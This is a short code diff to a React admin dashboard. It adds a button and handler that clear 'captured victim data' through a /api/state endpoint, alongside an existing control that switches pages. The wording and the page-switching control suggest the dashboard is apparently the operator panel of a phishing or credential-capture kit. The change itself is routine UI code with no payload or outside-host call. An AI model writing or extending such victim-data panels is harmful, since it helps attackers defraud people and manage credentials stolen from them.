@@ -15,7 +15,7 @@ import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Separator } from "@/components/ui/separator";
 import { Badge } from "@/components/ui/badge";
-import { RefreshCw, Trash2, UserCircle, Moon, Sun } from "lucide-react";
+import { RefreshCw, Trash2, UserCircle, Moon, Sun, UserX } from "lucide-react";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { useTheme } from "next-themes";
 import {
@@ -170,6 +170,22 @@ export function AdminDashboard() {
     }
   };
   
+  const handleClearVictimData = async () => {
+    if (window.confirm("Are you sure you want to clear all captured victim data? This cannot be undone.")) {
+      try {
+        await fetch("/api/state", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ action: "clearVictimData" }),
+        });
+        toast({ title: "Victim Data Cleared", description: "All captured data has been removed." });
+        fetchState();
+      } catch (error) {
+        toast({ variant: "destructive", title: "Error", description: "Could not clear victim data." });
+      }
+    }
+  };
+
   const handleControlClick = async (page: string) => {
     try {
       await fetch('/api/state', {
@@ -219,6 +235,7 @@ export function AdminDashboard() {
                           </DropdownMenuContent>
                         </DropdownMenu>
                         <Button variant="outline" size="icon" onClick={fetchState}><RefreshCw className="h-4 w-4" /></Button>
+                        <Button variant="outline" size="icon" onClick={handleClearVictimData}><UserX className="h-4 w-4" /></Button>
                         <Button variant="destructive" size="icon" onClick={handleResetState}><Trash2 className="h-4 w-4" /></Button>
                     </div>
                   </CardHeader>
